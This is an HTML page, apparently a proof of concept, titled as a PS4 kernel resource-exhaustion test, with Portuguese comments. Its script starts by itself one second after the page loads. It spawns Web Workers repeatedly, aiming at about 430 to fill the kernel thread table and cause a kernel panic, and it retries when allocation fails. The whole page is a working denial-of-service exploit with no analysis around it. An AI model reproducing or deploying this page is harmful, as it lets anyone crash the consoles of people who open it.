<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 Kernel Resource Exhaustion (PoC)</title>
    
</head>
<body>

    <h1>KERNEL STRESS TEST</h1>
    <div id="counter">0</div>
    <div id="status">Iniciando alocação...</div>
    <div class="bar"><div id="fill" class="fill"></div></div>

    <script>
        // O NÚMERO MÁGICO
        const TARGET_CRASH = 430; 
        const SAFE_ZONE = 400;
        
        let workers = [];
        // Worker mínimo para ocupar slot na tabela do kernel
        const blob = new Blob(["setInterval(()=>{}, 10000)"], {type:'text/javascript'});
        const url = URL.createObjectURL(blob);

        function updateUI(count) {
            document.getElementById('counter').innerText = count;
            const pct = Math.min(100, (count / TARGET_CRASH) * 100);
            document.getElementById('fill').style.width = pct + "%";
            
            if(count < SAFE_ZONE) {
                document.getElementById('status').innerText = "Enchendo Tabela de Threads...";
            } else {
                document.getElementById('status').innerText = "ZONA CRÍTICA: AGUARDANDO PANIC...";
                document.getElementById('status').style.color = "#ff0";
            }
        }

        function spawn() {
            try {
                const w = new Worker(url);
                workers.push(w);
                updateUI(workers.length);

                // LÓGICA DE VELOCIDADE
                if (workers.length < SAFE_ZONE) {
                    // Abaixo de 400: Vai rápido (5ms)
                    setTimeout(spawn, 5); 
                } else {
                    // Acima de 400: Vai devagar (50ms) para garantir que o Kernel sinta cada alocação
                    // Isso evita que o navegador trave antes do Kernel morrer
                    setTimeout(spawn, 50);
                }

            } catch(e) {
                // Se der erro de alocação (Userland OOM), tentamos forçar mais uma vez
                document.getElementById('status').innerText = "ERRO DE ALOCAÇÃO (Re-tentando...)";
                setTimeout(spawn, 100);
            }
        }

        // Início automático após 1 segundo
        setTimeout(spawn, 1000);

    </script>
</body>
</html>
